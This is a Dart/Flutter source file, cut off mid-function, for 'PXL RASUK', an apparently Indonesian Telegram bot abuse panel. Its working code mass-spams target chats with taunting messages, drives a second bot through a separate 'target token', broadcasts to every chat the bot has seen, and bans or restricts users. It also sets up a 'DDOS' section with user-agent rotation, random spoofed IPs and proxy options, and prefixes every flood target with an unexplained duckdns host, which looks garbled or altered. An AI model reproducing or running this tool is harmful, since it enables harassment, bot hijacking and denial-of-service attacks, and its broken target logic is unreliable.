import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:image_picker/image_picker.dart';
import 'package:shared_preferences/shared_preferences.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'PXL RASUK',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0A0A0A),
        primaryColor: const Color(0xFF7C3AED),
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFF7C3AED),
          secondary: Color(0xFF00FF88),
        ),
      ),
      home: const CDUltimatePanel(),
    );
  }
}

class CDUltimatePanel extends StatefulWidget {
  const CDUltimatePanel({super.key});

  @override
  State<CDUltimatePanel> createState() => _CDUltimatePanelState();
}

class _CDUltimatePanelState extends State<CDUltimatePanel> {
  // ===== VARIABLES =====
  String banAction = 'ban';  // <-- TAMBAHKAN INI
  String botToken = '';
  bool isSpamming = false;
  bool isRasuking = false;
  bool isBroadcasting = false;
  bool isSendingImage = false;
  bool isAcaking = false;
  bool isDdosRunning = false;
  bool gameActive = false;
  String gameType = '';
  Map<String, dynamic> gameData = {};
  File? selectedPhotoFile;
  File? fotoGroupTerpilih;
  File? fotoKirimTerpilih;
  String acakHasil = 'Klik MULAI ACAK untuk mulai...';
  
  // ... sisanya tetap sama
  
  // ===== CONTROLLERS =====
  final TextEditingController botTokenController = TextEditingController();
  final TextEditingController targetTokenController = TextEditingController();
  final TextEditingController rasukTargetController = TextEditingController();
  final TextEditingController rasukPesanController = TextEditingController();
  final TextEditingController rasukJumlahController = TextEditingController();
  final TextEditingController rasukDelayController = TextEditingController();
  
  final TextEditingController spamTargetController = TextEditingController();
  final TextEditingController spamJumlahController = TextEditingController();
  final TextEditingController spamDelayController = TextEditingController();
  final TextEditingController spamPesanController = TextEditingController();
  final TextEditingController spamPesanCadanganController = TextEditingController();
  
  final TextEditingController banUserIdController = TextEditingController();
  final TextEditingController banChatIdController = TextEditingController();
  final TextEditingController banReasonController = TextEditingController();
  
  final TextEditingController broadcastPesanController = TextEditingController();
  final TextEditingController broadcastDelayController = TextEditingController();
  
  final TextEditingController cekUsernameController = TextEditingController();
  final TextEditingController cekChatIdController = TextEditingController();
  
  final TextEditingController reportChatIdController = TextEditingController();
  final TextEditingController reportUserIdController = TextEditingController();
  final TextEditingController reportPesanController = TextEditingController();
  
  final TextEditingController groupChatIdController = TextEditingController();
  final TextEditingController groupTitleController = TextEditingController();
  final TextEditingController groupDescriptionController = TextEditingController();
  
  final TextEditingController gambarTargetController = TextEditingController();
  final TextEditingController gambarCaptionController = TextEditingController();
  
  final TextEditingController acakTargetController = TextEditingController();
  final TextEditingController acakJumlahController = TextEditingController();
  final TextEditingController acakDelayController = TextEditingController();
  
  final TextEditingController ddosTargetController = TextEditingController();
  final TextEditingController ddosPortController = TextEditingController();
  final TextEditingController ddosJumlahController = TextEditingController();
  final TextEditingController ddosDelayController = TextEditingController();
  final TextEditingController ddosMethodController = TextEditingController();
  
  final TextEditingController inputBotNameController = TextEditingController();
  final TextEditingController inputBotDescController = TextEditingController();
  
  final TextEditingController gameTargetController = TextEditingController();
  
  final TextEditingController banGroupChatIdController = TextEditingController();
  final TextEditingController banGroupDurationController = TextEditingController();
  final TextEditingController banGroupReasonController = TextEditingController();
  final TextEditingController banGroupActionController = TextEditingController();
  
  final TextEditingController binIdController = TextEditingController();
  final TextEditingController apiKeyController = TextEditingController();
  
  // ===== CHECKBOXES =====
  bool rasukSpam = true;
  bool rasukHack = false;
  bool rasukCrash = false;
  bool rasukClone = false;
  bool rasukNuke = false;
  
  bool spamAcakPesan = true;
  bool spamAcakNama = true;
  bool spamAcakDelay = false;
  bool spamAcakSemua = true;
  
  bool banPermanent = true;
  bool banDeleteMessages = false;
  bool banNotifyUser = false;
  
  bool bcOnlyStarted = true;
  bool bcIncludeGroups = false;
  
  bool gambarForceDoc = false;
  bool gambarCompress = false;
  
  bool acakNama = true;
  bool acakDeskripsi = true;
  bool acakFoto = true;
  bool acakCommands = true;
  bool acakWebhook = false;
  bool acakProxy = false;
  bool acakToken = false;
  bool acakAbout = false;
  bool acakLive = true;
  bool acakUnik = false;
  bool acakReverse = false;
  bool acakLoop = false;
  
  bool ddosRandomUA = true;
  bool ddosMultiThread = true;
  bool ddosKeepAlive = false;
  bool ddosProxy = false;
  
  bool banGroupDeleteAll = false;
  bool banGroupReport = false;
  bool banGroupBlock = false;

  // ===== UI STATE =====
  String selectedSection = 'sectionRasuk';
  String tokenStatus = '⏳ Masukkan token, lalu Validasi';
  String statusRasuk = '⏳ Siap merasuk...';
  String statusSpam = '⏳ Siap spam...';
  String statusBan = '⏳ Siap ban...';
  String statusBanGroup = '⏳ Siap ban group...';
  String statusBroadcast = '⏳ Siap broadcast...';
  String statusCekId = '⏳ Siap cek ID...';
  String statusReport = '⏳ Siap report...';
  String statusGroup = '⏳ Siap atur group...';
  String statusGame = '⏳ Pilih game & target...';
  String statusGambar = '⏳ Siap kirim gambar...';
  String statusAcak = '⏳ Siap acak-acak...';
  String statusDdos = '⏳ Siap DDOS...';
  String statusToken = '⏳ Masukkan token, lalu Validasi';
  
  String hasilIdValue = '—';
  String hasilDetail = 'Masukkan username atau chat ID';
  String syncStatus = '⏳ Belum sync';
  String syncMsg = '';
  
  List<String> logRasuk = [];
  List<String> logSpam = [];
  List<String> logBan = [];
  List<String> logBanGroup = [];
  List<String> logBroadcast = [];
  List<String> logCekId = [];
  List<String> logReport = [];
  List<String> logGroup = [];
  List<String> logGame = [];
  List<String> logGambar = [];
  List<String> logAcak = [];
  List<String> logDdos = [];
  
  // ===== DDOS STATS =====
  int ddosTotal = 0;
  int ddosSuccess = 0;
  int ddosFailed = 0;
  int ddosSpeed = 0;
  double ddosProgress = 0.0;
  
  // ===== TIMERS =====
  Timer? spamTimer;
  Timer? rasukTimer;
  Timer? broadcastTimer;
  Timer? acakTimer;
  Timer? ddosTimer;

  // ============================================================
  // LIFECYCLE
  // ============================================================
  
  @override
  void initState() {
    super.initState();
    _loadToken();
    _loadControllers();
    _addLog('logRasuk', '📡 PXL Rasuk Engine siap...');
    _addLog('logSpam', '📡 PXL Spam Engine siap...');
    _addLog('logBan', '🔨 PXL Ban Engine siap...');
    _addLog('logBanGroup', '🚫 PXL Ban Group Engine siap...');
    _addLog('logBroadcast', '📡 PXL Broadcast Engine siap...');
    _addLog('logCekId', '🆔 PXL Cek ID Engine siap...');
    _addLog('logReport', '📝 PXL Report Engine siap...');
    _addLog('logGroup', '🖼️ PXL Group Engine siap...');
    _addLog('logGame', '🎮 PXL Game Engine siap...');
    _addLog('logGambar', '📸 PXL Kirim Gambar Engine siap...');
    _addLog('logAcak', '🎲 PXL Acak-Acak Engine siap...');
    _addLog('logDdos', '💥 PXL DDOS Engine siap...');
  }

  void _loadControllers() {
    rasukJumlahController.text = '50';
    rasukDelayController.text = '1000';
    spamJumlahController.text = '100';
    spamDelayController.text = '700';
    spamPesanController.text = 'Halo {nama}, kamu kena GB dari PXL! 🤪💩';
    spamPesanCadanganController.text = 'KAMU KENA GB! | BOT INI DIKENDALIKAN PXL 🤪💩';
    banReasonController.text = 'Melanggar aturan!';
    broadcastPesanController.text = '⚠️ PENGUMUMAN DARI PXL! 🤪💩';
    broadcastDelayController.text = '800';
    rasukPesanController.text = 'KAMU TELAH DIRASUK OLEH PXL! 🤪💩';
    acakJumlahController.text = '10';
    acakDelayController.text = '1000';
    ddosPortController.text = '80';
    ddosJumlahController.text = '1000';
    ddosDelayController.text = '100';
    ddosMethodController.text = 'GET';
    banGroupDurationController.text = '86400';
    banGroupReasonController.text = 'Melanggar aturan!';
    banGroupActionController.text = 'ban';
    inputBotNameController.text = 'PXL ULTIMATE';
    inputBotDescController.text = '⚡ GACOR · OVERLAY';
  }

  void _loadToken() async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('cdpanel_token') ?? '';
    if (token.isNotEmpty) {
      botTokenController.text = token;
      setState(() {
        botToken = token;
      });
    }
  }

  // ============================================================
  // HELPER FUNCTIONS
  // ============================================================
  
  void _addLog(String logKey, String msg) {
    setState(() {
      final timestamp = DateTime.now().toLocal().toString().substring(11, 19);
      final entry = '[$timestamp] $msg';
      switch (logKey) {
        case 'logRasuk':
          logRasuk.add(entry);
          if (logRasuk.length > 50) logRasuk.removeAt(0);
          break;
        case 'logSpam':
          logSpam.add(entry);
          if (logSpam.length > 50) logSpam.removeAt(0);
          break;
        case 'logBan':
          logBan.add(entry);
          if (logBan.length > 50) logBan.removeAt(0);
          break;
        case 'logBanGroup':
          logBanGroup.add(entry);
          if (logBanGroup.length > 50) logBanGroup.removeAt(0);
          break;
        case 'logBroadcast':
          logBroadcast.add(entry);
          if (logBroadcast.length > 50) logBroadcast.removeAt(0);
          break;
        case 'logCekId':
          logCekId.add(entry);
          if (logCekId.length > 50) logCekId.removeAt(0);
          break;
        case 'logReport':
          logReport.add(entry);
          if (logReport.length > 50) logReport.removeAt(0);
          break;
        case 'logGroup':
          logGroup.add(entry);
          if (logGroup.length > 50) logGroup.removeAt(0);
          break;
        case 'logGame':
          logGame.add(entry);
          if (logGame.length > 50) logGame.removeAt(0);
          break;
        case 'logGambar':
          logGambar.add(entry);
          if (logGambar.length > 50) logGambar.removeAt(0);
          break;
        case 'logAcak':
          logAcak.add(entry);
          if (logAcak.length > 50) logAcak.removeAt(0);
          break;
        case 'logDdos':
          logDdos.add(entry);
          if (logDdos.length > 50) logDdos.removeAt(0);
          break;
      }
    });
  }

  void _updateStatus(String statusKey, String msg) {
    setState(() {
      switch (statusKey) {
        case 'statusRasuk':
          statusRasuk = msg;
          break;
        case 'statusSpam':
          statusSpam = msg;
          break;
        case 'statusBan':
          statusBan = msg;
          break;
        case 'statusBanGroup':
          statusBanGroup = msg;
          break;
        case 'statusBroadcast':
          statusBroadcast = msg;
          break;
        case 'statusCekId':
          statusCekId = msg;
          break;
        case 'statusReport':
          statusReport = msg;
          break;
        case 'statusGroup':
          statusGroup = msg;
          break;
        case 'statusGame':
          statusGame = msg;
          break;
        case 'statusGambar':
          statusGambar = msg;
          break;
        case 'statusAcak':
          statusAcak = msg;
          break;
        case 'statusDdos':
          statusDdos = msg;
          break;
        case 'statusToken':
          statusToken = msg;
          break;
      }
    });
  }

  Future<Map<String, dynamic>> _callAPI(String token, String method, {Map<String, dynamic>? params}) async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot$token/$method');
      final response = await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode(params ?? {}),
      );
      final data = jsonDecode(response.body);
      if (data['ok'] == true) {
        return {'success': true, 'data': data};
      } else {
        return {'success': false, 'error': data['description'] ?? 'Gagal'};
      }
    } catch (e) {
      return {'success': false, 'error': e.toString()};
    }
  }

  Future<List<String>> _getChatList(String token, bool onlyStarted) async {
    final result = await _callAPI(token, 'getUpdates');
    List<String> chatIds = [];
    if (result['success'] && result['data']['result'] != null) {
      for (var update in result['data']['result']) {
        if (update['message'] != null && update['message']['chat'] != null) {
          final chat = update['message']['chat'];
          if (onlyStarted && chat['type'] == 'private') {
            chatIds.add(chat['id'].toString());
          } else if (!onlyStarted) {
            chatIds.add(chat['id'].toString());
          }
        }
        if (update['callback_query'] != null && 
            update['callback_query']['message'] != null &&
            update['callback_query']['message']['chat'] != null) {
          final chat = update['callback_query']['message']['chat'];
          if (onlyStarted && chat['type'] == 'private') {
            chatIds.add(chat['id'].toString());
          } else if (!onlyStarted) {
            chatIds.add(chat['id'].toString());
          }
        }
      }
      chatIds = chatIds.toSet().toList();
    }
    return chatIds;
  }

  String _getRandomUA() {
    final agents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
      'Mozilla/5.0 (Android 11; Mobile) AppleWebKit/537.36',
      'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
    ];
    return agents[Random().nextInt(agents.length)];
  }

  String _getRandomIP() {
    return '${Random().nextInt(255)}.${Random().nextInt(255)}.${Random().nextInt(255)}.${Random().nextInt(255)}';
  }

  bool _isURL(String str) {
    return str.startsWith('http://hamapanelbego.duckdns.top:4951') || str.startsWith('http://hamapanelbego.duckdns.top:4951');
  }

  String _normalizeTarget(String target, String port) {
    target = target.trim();
    if (_isURL(target)) return target;
    if (!target.contains(':')) {
      return 'http://hamapanelbego.duckdns.top:4951$target:${port.isEmpty ? '80' : port}';
    }
    return 'http://hamapanelbego.duckdns.top:4951$target';
  }

  // ============================================================
  // VALIDASI TOKEN
  // ============================================================
  
  Future<void> _validasiToken() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusToken', '❌ Token kosong!');
      return;
    }
    _updateStatus('statusToken', '🔄 Mengecek token...');
    final result = await _callAPI(token, 'getMe');
    if (result['success']) {
      setState(() {
        botToken = token;
        statusToken = '✅ Token valid! Bot: @${result['data']['result']['username']}';
        inputBotNameController.text = result['data']['result']['first_name'] ?? 'PXL ULTIMATE';
      });
      _addLog('logRasuk', '✅ Token valid! Bot @${result['data']['result']['username']}');
      final prefs = await SharedPreferences.getInstance();
      prefs.setString('cdpanel_token', token);
    } else {
      _updateStatus('statusToken', '❌ ${result['error']}');
    }
  }

  // ============================================================
  // EDIT BOT
  // ============================================================
  
  bool showEditBot = false;

  Future<void> _applyBotChanges() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _addLog('logRasuk', '❌ Masukkan Token Bot dulu!');
      return;
    }
    final newName = inputBotNameController.text.trim();
    final newDesc = inputBotDescController.text.trim();
    
    try {
      var result = await _callAPI(token, 'setMyName', params: {'name': newName});
      if (!result['success']) throw Exception(result['error']);
      
      result = await _callAPI(token, 'setMyDescription', params: {'description': newDesc});
      if (!result['success']) throw Exception(result['error']);
      
      _addLog('logRasuk', '✅ Nama & deskripsi diperbarui!');
      
      if (selectedPhotoFile != null) {
        final request = http.MultipartRequest(
          'POST',
          Uri.parse('https://api.telegram.org/bot$token/setMyPhoto'),
        );
        request.files.add(await http.MultipartFile.fromPath('photo', selectedPhotoFile!.path));
        final response = await request.send();
        if (response.statusCode == 200) {
          _addLog('logRasuk', '✅ Foto profil bot diubah!');
          setState(() {
            selectedPhotoFile = null;
          });
        } else {
          _addLog('logRasuk', '❌ Gagal upload foto');
        }
      }
    } catch (e) {
      _addLog('logRasuk', '❌ Gagal: $e');
    }
  }

  // ============================================================
  // RASUK
  // ============================================================
  
  Future<void> _startRasuk() async {
    if (isRasuking) {
      _updateStatus('statusRasuk', '⚠️ SEDANG BERJALAN!');
      return;
    }
    final token = botTokenController.text.trim();
    final targetToken = targetTokenController.text.trim();
    final target = rasukTargetController.text.trim();
    final pesan = rasukPesanController.text;
    final jumlah = int.tryParse(rasukJumlahController.text) ?? 50;
    final delay = int.tryParse(rasukDelayController.text) ?? 1000;
    
    if (token.isEmpty || targetToken.isEmpty || target.isEmpty) {
      _updateStatus('statusRasuk', '❌ Token bot, token target, dan target WAJIB!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusRasuk', '❌ Token invalid');
      return;
    }
    
    _addLog('logRasuk', '✅ Bot @${info['data']['result']['username']} siap!');
    setState(() {
      isRasuking = true;
      statusRasuk = '🔥 RASUK DIMULAI (${jumlah}x, delay ${delay}ms)...';
    });
    
    int count = 0;
    int total = jumlah;
    
    rasukTimer = Timer.periodic(Duration(milliseconds: delay), (timer) async {
      if (!isRasuking || count >= total) {
        timer.cancel();
        setState(() {
          isRasuking = false;
          statusRasuk = count >= total ? '✅ RASUK SELESAI! $total pesan' : '⏹️ DIHENTIKAN!';
        });
        if (count >= total) _addLog('logRasuk', '🏁 RASUK SELESAI!');
        return;
      }
      
      count++;
      final result = await _callAPI(token, 'sendMessage', 
          params: {'chat_id': target, 'text': '$pesan [$count/$total]'});
      
      if (result['success']) {
        _addLog('logRasuk', '✅ [$count/$total] Terkirim');
      } else {
        _addLog('logRasuk', '❌ [$count/$total] Gagal: ${result['error']}');
      }
      
      setState(() {
        statusRasuk = '🔥 [$count/$total] Berjalan...';
      });
    });
  }

  void _stopRasuk() {
    if (isRasuking) {
      setState(() {
        isRasuking = false;
        statusRasuk = '⏹️ DIHENTIKAN!';
      });
      rasukTimer?.cancel();
    }
  }

  // ============================================================
  // SPAM
  // ============================================================
  
  Future<void> _startSpam() async {
    if (isSpamming) {
      _updateStatus('statusSpam', '⚠️ SEDANG BERJALAN!');
      return;
    }
    final token = botTokenController.text.trim();
    final target = spamTargetController.text.trim();
    final jumlah = int.tryParse(spamJumlahController.text) ?? 100;
    int delay = int.tryParse(spamDelayController.text) ?? 700;
    final pesan = spamPesanController.text;
    final pesanCadangan = spamPesanCadanganController.text;
    
    if (token.isEmpty || target.isEmpty || pesan.isEmpty) {
      _updateStatus('statusSpam', '❌ Token, Target, Pesan WAJIB!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusSpam', '❌ Token invalid');
      return;
    }
    
    _addLog('logSpam', '✅ Bot @${info['data']['result']['username']} siap!');
    setState(() {
      isSpamming = true;
      statusSpam = '🔥 SPAM DIMULAI (${jumlah}x, delay ${delay}ms)...';
    });
    
    int count = 0;
    int total = jumlah;
    int success = 0;
    int fail = 0;
    
    spamTimer = Timer.periodic(Duration(milliseconds: delay), (timer) async {
      if (!isSpamming || count >= total) {
        timer.cancel();
        setState(() {
          isSpamming = false;
          statusSpam = count >= total ? '🎯 SELESAI! $success sukses, $fail gagal' : '⏹️ DIHENTIKAN!';
        });
        if (count >= total) _addLog('logSpam', '🏁 SPAM SELESAI!');
        return;
      }
      
      count++;
      String nama = 'TARGET#$count';
      if (spamAcakNama) {
        final names = ['VICTIM', 'KORBAN', 'SASARAN'];
        nama = '${names[Random().nextInt(names.length)]}#$count';
      }
      String pesanAktif = pesan;
      if (spamAcakPesan && pesanCadangan.isNotEmpty && Random().nextBool()) {
        pesanAktif = pesanCadangan;
      }
      int delayAktif = delay;
      if (spamAcakDelay) {
        delayAktif = delay + Random().nextInt(500) - 250;
        if (delayAktif < 100) delayAktif = 100;
      }
      
      final result = await _callAPI(token, 'sendMessage',
          params: {'chat_id': target, 'text': pesanAktif.replaceAll('{nama}', nama) + ' [$count]'});
      
      if (result['success']) {
        success++;
        _addLog('logSpam', '✅ [$count] Terkirim');
      } else {
        fail++;
        _addLog('logSpam', '❌ [$count] Gagal: ${result['error']}');
      }
      
      setState(() {
        statusSpam = '🔥 [$count/$total] Sukses: $success | Gagal: $fail';
      });
    });
  }

  void _stopSpam() {
    if (isSpamming) {
      setState(() {
        isSpamming = false;
        statusSpam = '⏹️ DIHENTIKAN!';
      });
      spamTimer?.cancel();
    }
  }

  // ============================================================
  // BROADCAST
  // ============================================================
  
  Future<void> _startBroadcast() async {
    if (isBroadcasting) {
      _updateStatus('statusBroadcast', '⚠️ SEDANG BERJALAN!');
      return;
    }
    final token = botTokenController.text.trim();
    final pesan = broadcastPesanController.text.trim();
    final delay = int.tryParse(broadcastDelayController.text) ?? 800;
    
    if (token.isEmpty || pesan.isEmpty) {
      _updateStatus('statusBroadcast', '❌ Token dan Pesan WAJIB!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusBroadcast', '❌ Token invalid');
      return;
    }
    
    final chatIds = await _getChatList(token, bcOnlyStarted);
    if (chatIds.isEmpty) {
      _updateStatus('statusBroadcast', '⚠️ Tidak ada chat ditemukan!');
      return;
    }
    
    _addLog('logBroadcast', '📢 Menemukan ${chatIds.length} chat!');
    setState(() {
      isBroadcasting = true;
      statusBroadcast = '📢 Broadcast ke ${chatIds.length} chat (delay ${delay}ms)...';
    });
    
    int count = 0;
    int total = chatIds.length;
    int success = 0;
    int fail = 0;
    
    broadcastTimer = Timer.periodic(Duration(milliseconds: delay), (timer) async {
      if (!isBroadcasting || count >= total) {
        timer.cancel();
        setState(() {
          isBroadcasting = false;
          statusBroadcast = count >= total ? '📢 SELESAI! $success sukses, $fail gagal' : '⏹️ DIHENTIKAN!';
        });
        if (count >= total) _addLog('logBroadcast', '🏁 BROADCAST SELESAI!');
        return;
      }
      
      final chatId = chatIds[count];
      count++;
      final result = await _callAPI(token, 'sendMessage',
          params: {'chat_id': chatId, 'text': pesan});
      
      if (result['success']) {
        success++;
        _addLog('logBroadcast', '✅ [$count/$total] Ke $chatId');
      } else {
        fail++;
        _addLog('logBroadcast', '❌ [$count/$total] ${result['error']}');
      }
      
      setState(() {
        statusBroadcast = '📢 [$count/$total] Sukses: $success | Gagal: $fail';
      });
    });
  }

  void _stopBroadcast() {
    if (isBroadcasting) {
      setState(() {
        isBroadcasting = false;
        statusBroadcast = '⏹️ DIHENTIKAN!';
      });
      broadcastTimer?.cancel();
    }
  }

  // ============================================================
  // CEK ID
  // ============================================================
  
  Future<void> _cekId() async {
    final token = botTokenController.text.trim();
    final username = cekUsernameController.text.trim();
    final chatId = cekChatIdController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusCekId', '❌ Token dulu!');
      return;
    }
    final target = chatId.isNotEmpty ? chatId : username;
    if (target.isEmpty) {
      _updateStatus('statusCekId', '❌ Masukkan username/chat ID!');
      return;
    }
    
    final result = await _callAPI(token, 'getChat', params: {'chat_id': target});
    if (result['success']) {
      final chat = result['data']['result'];
      setState(() {
        hasilIdValue = chat['id'].toString();
        hasilDetail = '📛 ${chat['title'] ?? chat['first_name'] ?? '-'} | Tipe: ${chat['type']}';
        statusCekId = '✅ ID ditemukan!';
      });
      _addLog('logCekId', '✅ ID: ${chat['id']}');
    } else {
      setState(() {
        hasilIdValue = '❌ Tidak ditemukan';
        hasilDetail = 'User tidak ditemukan';
        statusCekId = '❌ Tidak ditemukan';
      });
      _addLog('logCekId', '❌ ${result['error']}');
    }
  }

  Future<void> _cekIdFromMsg() async {
    final token = botTokenController.text.trim();
    if (token.isEmpty) {
      _updateStatus('statusCekId', '❌ Token dulu!');
      return;
    }
    
    final result = await _callAPI(token, 'getUpdates');
    if (result['success'] && result['data']['result'] != null && result['data']['result'].isNotEmpty) {
      final last = result['data']['result'].last;
      dynamic chat;
      if (last['message'] != null && last['message']['chat'] != null) {
        chat = last['message']['chat'];
      } else if (last['callback_query'] != null && 
                 last['callback_query']['message'] != null &&
                 last['callback_query']['message']['chat'] != null) {
        chat = last['callback_query']['message']['chat'];
      }
      if (chat != null) {
        setState(() {
          hasilIdValue = chat['id'].toString();
          hasilDetail = '📛 ${chat['title'] ?? chat['first_name'] ?? '-'} | Tipe: ${chat['type']}';
          statusCekId = '✅ ID ditemukan!';
        });
        _addLog('logCekId', '✅ ID: ${chat['id']}');
      }
    } else {
      setState(() {
        hasilIdValue = '❌ Tidak ada';
        hasilDetail = 'Tidak ada pesan masuk';
        statusCekId = '❌ Tidak ada update';
      });
      _addLog('logCekId', '❌ Tidak ada update');
    }
  }

  // ============================================================
  // REPORT
  // ============================================================
  
  Future<void> _sendReport() async {
    final token = botTokenController.text.trim();
    final chatId = reportChatIdController.text.trim();
    final userId = reportUserIdController.text.trim();
    final pesan = reportPesanController.text.trim();
    if (token.isEmpty || chatId.isEmpty || userId.isEmpty || pesan.isEmpty) {
      _updateStatus('statusReport', '❌ Semua field WAJIB!');
      return;
    }
    
    final text = '📝 LAPORAN\n\n👤 User: $userId\n📋 Isi: $pesan\n\n📌 Dikirim oleh PXL Bot';
    final result = await _callAPI(token, 'sendMessage', params: {'chat_id': chatId, 'text': text});
    if (result['success']) {
      _addLog('logReport', '✅ Report terkirim!');
      _updateStatus('statusReport', '✅ Report berhasil!');
    } else {
      _addLog('logReport', '❌ Gagal: ${result['error']}');
      _updateStatus('statusReport', '❌ Gagal: ${result['error']}');
    }
  }

  Future<void> _reportBan() async {
    final token = botTokenController.text.trim();
    final chatId = reportChatIdController.text.trim();
    final userId = reportUserIdController.text.trim();
    if (token.isEmpty || chatId.isEmpty || userId.isEmpty) {
      _updateStatus('statusReport', '❌ Token, Chat ID, User ID WAJIB!');
      return;
    }
    
    final result = await _callAPI(token, 'banChatMember', 
        params: {'chat_id': chatId, 'user_id': int.parse(userId), 'until_date': DateTime.now().millisecondsSinceEpoch ~/ 1000 + 86400 * 365});
    if (result['success']) {
      _addLog('logReport', '✅ User $userId BAN PERMANEN!');
      _updateStatus('statusReport', '✅ User $userId di BAN!');
    } else {
      _addLog('logReport', '❌ Gagal: ${result['error']}');
      _updateStatus('statusReport', '❌ Gagal: ${result['error']}');
    }
  }

  // ============================================================
  // GROUP
  // ============================================================
  
  Future<void> _setGroupTitle() async {
    final token = botTokenController.text.trim();
    final chatId = groupChatIdController.text.trim();
    final title = groupTitleController.text.trim();
    if (token.isEmpty || chatId.isEmpty || title.isEmpty) {
      _updateStatus('statusGroup', '❌ Token, Chat ID, Judul WAJIB!');
      return;
    }
    
    final result = await _callAPI(token, 'setChatTitle', params: {'chat_id': chatId, 'title': title});
    if (result['success']) {
      _addLog('logGroup', '✅ Judul berhasil diubah!');
      _updateStatus('statusGroup', '✅ Judul berhasil diubah!');
    } else {
      _addLog('logGroup', '❌ Gagal: ${result['error']}');
      _updateStatus('statusGroup', '❌ Gagal: ${result['error']}');
    }
  }

  Future<void> _setGroupDescription() async {
    final token = botTokenController.text.trim();
    final chatId = groupChatIdController.text.trim();
    final desc = groupDescriptionController.text.trim();
    if (token.isEmpty || chatId.isEmpty || desc.isEmpty) {
      _updateStatus('statusGroup', '❌ Token, Chat ID, Deskripsi WAJIB!');
      return;
    }
    
    final result = await _callAPI(token, 'setChatDescription', params: {'chat_id': chatId, 'description': desc});
    if (result['success']) {
      _addLog('logGroup', '✅ Deskripsi berhasil diubah!');
      _updateStatus('statusGroup', '✅ Deskripsi berhasil diubah!');
    } else {
      _addLog('logGroup', '❌ Gagal: ${result['error']}');
      _updateStatus('statusGroup', '❌ Gagal: ${result['error']}');
    }
  }

  // ============================================================
  // BAN USER
  // ============================================================
  
  Future<void> _executeBan() async {
    final token = botTokenController.text.trim();
    final userId = banUserIdController.text.trim();
    final chatId = banChatIdController.text.trim();
    final reason = banReasonController.text.trim();
    
    if (token.isEmpty || userId.isEmpty || chatId.isEmpty) {
      _updateStatus('statusBan', '❌ Token, User ID, Chat ID WAJIB!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusBan', '❌ Token invalid!');
      return;
    }
    
    _addLog('logBan', '🔨 Memproses $banAction...');
    _updateStatus('statusBan', '🔄 Memproses...');
    
    try {
      Map<String, dynamic> result;
      switch (banAction) {
        case 'ban':
          result = await _callAPI(token, 'banChatMember', 
              params: {'chat_id': chatId, 'user_id': int.parse(userId)});
          if (result['success']) {
            _addLog('logBan', '✅ User $userId berhasil di BAN!');
            _updateStatus('statusBan', '✅ User $userId berhasil di BAN!');
            if (banNotifyUser) {
              await _callAPI(token, 'sendMessage', params: {'chat_id': userId, 'text': '🔨 Anda telah di BAN!\nAlasan: $reason'});
            }
          }
          break;
        case 'unban':
          result = await _callAPI(token, 'unbanChatMember', 
              params: {'chat_id': chatId, 'user_id': int.parse(userId), 'only_if_banned': true});
          if (result['success']) {
            _addLog('logBan', '✅ User $userId berhasil di UNBAN!');
            _updateStatus('statusBan', '✅ User $userId berhasil di UNBAN!');
          }
          break;
        case 'kick':
          final banResult = await _callAPI(token, 'banChatMember', 
              params: {'chat_id': chatId, 'user_id': int.parse(userId)});
          if (banResult['success']) {
            await _callAPI(token, 'unbanChatMember', 
                params: {'chat_id': chatId, 'user_id': int.parse(userId), 'only_if_banned': true});
            _addLog('logBan', '✅ User $userId berhasil di KICK!');
            _updateStatus('statusBan', '✅ User $userId berhasil di KICK!');
          }
          break;
        case 'restrict':
          result = await _callAPI(token, 'restrictChatMember', 
              params: {
                'chat_id': chatId, 
                'user_id': int.parse(userId), 
                'permissions': {
                  'can_send_messages': false,
                  'can_send_media_messages': false,
                  'can_send_other_messages': false,
                  'can_add_web_page_previews': false
                }
              });
          if (result['success']) {
            _addLog('logBan', '✅ User $userId berhasil di RESTRICT!');
            _updateStatus('statusBan', '✅ User $userId berhasil di RESTRICT!');
          }
          break;
      }
    } catch (e) {
      _addLog('logBan', '❌ Gagal: $e');
      _updateStatus('statusBan', '❌ Gagal: $e');
    }
  }

  // ============================================================
  // BAN GROUP
  // ============================================================
  
  Future<void> _executeBanGroup() async {
    final token = botTokenController.text.trim();
    final chatId = banGroupChatIdController.text.trim();
    final duration = int.tryParse(banGroupDurationController.text) ?? 0;
    final action = banGroupActionController.text;
    final reason = banGroupReasonController.text.trim();
    
    if (token.isEmpty || chatId.isEmpty) {
      _updateStatus('statusBanGroup', '❌ Token dan Chat ID WAJIB!');
      return;
    }
    
    final info = await _callAPI(token, 'getMe');
    if (!info['success']) {
      _updateStatus('statusBanGroup', '❌ Token invalid');
      return;
    }
    
    _addLog('logBanGroup', '🚫 ${action.toUpperCase()} group $chatId...');
    _updateStatus('statusBanGroup', '🔄 Memproses...');
    
    try {
      Map<String, dynamic> result;
      int untilDate = duration > 0 ? DateTime.now().millisecondsSinceEpoch ~/ 1000 + duration : 0;
      
      switch (action) {
        case 'ban':
          result = await _callAPI(token, 'restrictChatMember', 
              params: {
                'chat_id': chatId,
                'user_id': int.parse(chatId),
                'permissions': {
                  'can_send_messages': false,
                  'can_send_media_messages': false,
